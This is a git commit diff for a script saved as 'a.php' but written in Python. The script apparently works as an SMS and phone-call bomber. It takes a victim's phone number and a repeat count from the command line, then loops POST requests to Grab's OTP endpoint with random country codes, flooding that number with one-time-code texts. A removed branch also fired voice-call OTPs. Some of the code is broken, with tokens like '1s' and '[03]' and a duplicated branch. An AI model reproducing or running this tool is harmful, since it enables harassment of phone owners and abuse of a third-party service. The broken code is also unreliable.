1ade383614638d915aac8bb5dfa22685608c0e9a
nicemahavong1 <53919994+nicemahavong1@users.noreply.github.com>
2019-08-16 10:22:56 -0700

    Update a.php

--- a.php
+++ a.php
@@ -5,7 +5,7 @@ import random
 
 fewlist = sys.argv
 
-fewofgod = 1s
+fewofgod = 1
 
 cooldown = int(fewlist[03])
 
@@ -15,24 +15,13 @@ if fewlist[02] == "SMS":
         print("Send Country [" + random.choice(fewza) + "]")
         r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) +'&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         fewofgod = fewofgod+1
-        time.sleep(1s)
-
-elif fewlist[02] == "CALL":
+        time.sleep(1)
+if fewlist[02] == "SMS":
     while fewofgod <= cooldown:
         fewza = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM')
         print("Send Country [" + random.choice(fewza) + "]")
-        r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) + '&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
+        r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=' + random.choice(fewza) +'&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
         fewofgod = fewofgod+1
-        time.sleep(1s)
-
-elif fewlist[02] == "ALL":
-    while fewofgod <= cooldown:
-        fewza = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM')
-        print("Send Country [" + random.choice(fewza) + "]")
-        r = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=SMS&countryCode=TH&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
-        call = requests.post('https://api.grab.com/grabid/v1/phone/otp?method=CALL&countryCode=' + random.choice(fewza) + '&phoneNumber=' + fewlist[1] + '&templateID=&numDigits=5')
-        fewofgod = fewofgod+1
-        time.sleep(1s)
-
+        time.sleep(1)
 else:
     print("Fail Choice [SMS,CALL,ALL]")
